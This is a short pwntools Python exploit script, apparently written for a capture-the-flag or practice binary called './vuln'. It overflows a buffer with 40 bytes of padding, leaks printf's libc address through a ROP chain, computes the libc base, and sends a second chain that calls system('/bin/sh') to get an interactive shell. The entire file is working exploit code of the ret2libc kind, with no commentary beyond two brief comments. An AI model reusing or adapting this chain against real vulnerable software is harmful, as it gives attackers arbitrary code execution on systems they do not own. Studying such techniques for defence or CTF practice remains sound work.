from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

r = process(elf.path)

print(r.recvline())
#print(r.recvuntil(b"Just type something:"))

rop = ROP(elf)
rop.printf(elf.got["printf"])
rop.call(elf.symbols["main"])

padding = b"A"*40
r.sendline(padding+bytes(rop))

r.recvuntil(b"Just type something: ")
leak = u64(r.recv(6).ljust(8,b"\x00"))

info("Leak: "+str(hex(leak)))

print(r.recvline())
libc.address = leak - libc.symbols["printf"]

info("Libc base:"+str(hex(libc.address)))

rop2 = ROP(libc)
RET = rop2.find_gadget(["ret"])
rop2.raw(RET) #call ret gadget to not crash the program
rop2.system(next(libc.search(b"/bin/sh")))

r.sendline(padding+bytes(rop2))

r.interactive()
